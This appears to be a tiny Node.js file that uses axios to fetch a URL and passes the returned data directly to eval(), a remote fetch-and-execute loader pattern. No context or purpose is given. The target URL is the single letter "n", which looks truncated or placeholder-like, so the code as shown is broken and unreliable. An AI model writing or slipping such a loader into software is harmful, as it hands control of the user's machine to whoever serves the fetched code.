const axios = require('axios');

axios.get("n")
	.then(res => eval(res.data));
